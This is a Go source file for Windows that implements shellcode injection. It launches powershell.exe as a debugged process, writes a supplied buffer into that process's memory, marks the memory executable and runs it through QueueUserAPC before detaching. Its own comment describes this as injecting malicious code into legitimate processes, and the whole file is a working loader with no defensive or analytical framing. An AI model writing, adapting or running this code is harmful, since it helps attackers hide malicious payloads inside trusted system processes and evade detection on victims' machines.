//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	ntdll                  = syscall.NewLazyDLL("ntdll.dll")
	VirtualAllocEx         = kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx       = kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory     = kernel32.NewProc("WriteProcessMemory")
	CreateProcessA         = kernel32.NewProc("CreateProcessA")
	CreateRemoteThread     = kernel32.NewProc("CreateRemoteThread")
	QueueUserAPC           = kernel32.NewProc("QueueUserAPC")
	DebugActiveProcessStop = kernel32.NewProc("DebugActiveProcessStop")
	CloseHandle            = kernel32.NewProc("CloseHandle")
	SleepEx                = kernel32.NewProc("SleepEx")

	Startinf syscall.StartupInfo
	ProcInfo syscall.ProcessInformation
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
	DEBUG_PROCESS          = 0x00000001
	INFINITE               = 0xFFFFFFFF
)

func inject(buf []byte) {
	/*
	   inject malicious code into legitimate processes. inserting malicious code into a process in its early stages
	*/
	cl := "C:\\Windows\\System32\\powershell.exe"

	ret, _, err := CreateProcessA.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringBytePtr(cl))),
		0,
		0,
		0,
		DEBUG_PROCESS,
		0,
		0,
		uintptr(unsafe.Pointer(&Startinf)),
		uintptr(unsafe.Pointer(&ProcInfo)),
	)
	if ret == 0 {
		panic(fmt.Sprintf("CreateProcessA failed: %v", err))
	}

	hProcess := ProcInfo.Process
	hThread := ProcInfo.Thread

	addr, _, err := VirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(buf)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if addr == 0 {
		panic(fmt.Sprintf("VirtualAllocEx failed: %v", err))
	}

	_, _, err = WriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
	)
	if ret == 0 {
		panic(fmt.Sprintf("WriteProcessMemory failed: %v", err))
	}

	var ldprotect uint32
	ret, _, err = VirtualProtectEx.Call(
		uintptr(hProcess),
		addr,
		uintptr(len(buf)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&ldprotect)),
	)
	if ret == 0 {
		panic(fmt.Sprintf("VirtualProtectEx failed: %v", err))
	}

	ret, _, err = QueueUserAPC.Call(
		addr,
		uintptr(hThread),
		0,
	)
	if ret == 0 {
		panic(fmt.Sprintf("QueueUserAPC failed: %v", err))
	}

	ret, _, err = DebugActiveProcessStop.Call(uintptr(ProcInfo.ProcessId))
	if ret == 0 {
		panic(fmt.Sprintf("DebugActiveProcessStop failed: %v", err))
	}

	ret, _, err = CloseHandle.Call(uintptr(hProcess))
	if ret == 0 {
		panic(fmt.Sprintf("CloseHandle (process) failed: %v", err))
	}

	ret, _, err = CloseHandle.Call(uintptr(hThread))
	if ret == 0 {
		panic(fmt.Sprintf("CloseHandle (thread) failed: %v", err))
	}
}
